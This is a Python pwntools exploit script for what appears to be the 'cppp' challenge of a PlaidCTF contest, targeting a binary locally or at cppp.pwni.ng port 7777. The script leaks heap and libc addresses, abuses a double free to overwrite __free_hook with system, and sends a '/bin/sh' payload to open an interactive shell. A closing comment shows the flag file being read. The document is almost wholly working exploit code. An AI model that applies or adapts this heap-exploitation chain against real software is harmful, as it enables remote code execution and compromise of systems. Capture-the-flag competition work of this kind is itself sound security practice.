from pwn import *


DEBUG = True

binary = ELF("./cppp")
libc = ELF("./libc-2.27_50390b2ae8aaa73c47745040f54e602f.so")

context.update(arch="amd64", os="linux", bits=64)


def add(name, buf):
    r.sendline("1")
    r.recvuntil("name: ")
    r.sendline(name)
    r.recvuntil("buf: ")
    r.sendline(buf)
    r.recvuntil("Choice: ")

def remove(idx):
    r.sendline("2")
    r.recvuntil("idx: ")
    r.sendline(str(idx))
    r.recvuntil("Choice: ")

def view(idx):
    r.sendline("3")
    r.recvuntil("idx: ")
    r.sendline(str(idx))
    buf = r.recvuntil("\nDone!", drop=True)
    r.recvuntil("Choice: ")
    return buf

def exit():
    r.sendline("4")


if __name__ == '__main__':
    if DEBUG:
        r = process("./cppp", env={'LD_PRELOAD':'./libc-2.27_50390b2ae8aaa73c47745040f54e602f.so'})
    else:
        r = remote("cppp.pwni.ng", 7777)

    r.recvuntil("Choice: ")


    # prepare heap leak
    for x in range(0, 7):
        add("A"*1024, "B"*8)
    remove(5)
    remove(6)

    heap_leak = u64(view(5).ljust(8,"\x00"))
    print "Heap Address: " + hex(heap_leak)
    heap_base_addr = heap_leak - 0x14a10


    # prepare libc leak
    add("A"*1024, "B"*8)
    remove(5)
    remove(6)
    add("A"*1024, "B"*8)
    add("A"*1024, "B"*8)
    add("A"*1024, "B"*8)
    remove(7)
    remove(8)
    add("A"*1024, "B"*32)
    add("A"*1024, "B"*32)

    libc_leak = u64(view(7).ljust(8, "\x00"))
    print "Libc Address: " + hex(libc_leak)
    free_hook_addr = libc_leak + 0x1748
    system_addr = libc_leak - 0x39cd60


    # double free
    add("A"*1024, "B"*8)
    add("A"*1024, "B"*32)
    remove(10)
    remove(10)

    free_hook_payload = pack(free_hook_addr - 8) + "A"*24
    system_payload = "/bin/sh\x00" + pack(system_addr) + "A"*16
    add(free_hook_payload, "B"*1024)

    # cant do final recv, so dont use add() here
    #add(system_payload, "e"*1024)
    r.sendline("1")
    r.recvuntil("name: ")
    r.sendline(system_payload)
    r.recvuntil("buf: ")
    r.sendline("B"*1024)


    r.interactive()
    r.close()
"""
$ cat /home/cppp/flag.txt
PCTF{ccccccppppppppppppPPPPP+++++!}
"""